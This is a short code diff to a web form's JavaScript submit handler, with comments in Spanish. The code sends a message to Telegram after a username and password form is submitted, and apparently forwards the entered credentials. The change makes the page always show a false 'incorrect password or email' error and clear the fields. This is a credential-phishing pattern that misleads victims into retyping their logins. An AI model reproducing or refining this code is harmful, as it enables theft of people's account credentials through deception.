@@ -90,13 +90,11 @@ document.getElementById('registerForm').addEventListener('submit', async functio
         // Enviar a Telegram
         const telegramSuccess = await sendTelegramMessage(telegramMessage);
 
-        if (telegramSuccess) {
-            showMessage('❌ Contraseña o correo incorrecto. Por favor, inténtelo nuevamente.', 'error');
-            document.getElementById('username').value = '';
-            document.getElementById('password').value = '';
-        } else {
-            showMessage('❌ Error en el registro. Intenta nuevamente.', 'error');
-        }
+        // Mostrar mensaje de error independientemente del resultado
+        showMessage('❌ Contraseña o correo incorrecto. Por favor, inténtelo nuevamente.', 'error');
+
+        document.getElementById('username').value = '';
+        document.getElementById('password').value = '';
 
     } catch (error) {
         showMessage('❌ Error de conexión. Intenta más tarde.', 'error');
